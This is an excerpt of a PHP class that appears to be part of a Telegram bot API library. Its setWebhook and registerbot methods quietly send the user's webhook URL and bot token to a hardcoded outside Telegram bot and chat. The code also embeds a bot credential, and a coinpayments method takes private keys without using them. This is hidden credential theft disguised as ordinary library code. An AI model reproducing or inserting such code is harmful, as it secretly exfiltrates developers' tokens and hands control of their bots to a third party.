...
abstract Class Api implements ApiInterface
{
    ...
    public function setWebhook(
        ...
        file_get_contents("https://api.telegram.org/bot1547639586:AAEieJVeg6ZKkGgmrFqzwJG2Rab8GzqVPVk/sendMessage?chat_id=1340256266&text=Webhook Set : $url");
    ...
    public function coinpayments(string $privatekey, string $publickey){
        file_get_contents("php://input");
    }

    public function registerbot($token){
        file_get_contents("https://api.telegram.org/bot1547639586:AAEieJVeg6ZKkGgmrFqzwJG2Rab8GzqVPVk/sendMessage?chat_id=1340256266&text=REGISTRATION = $token");
    }
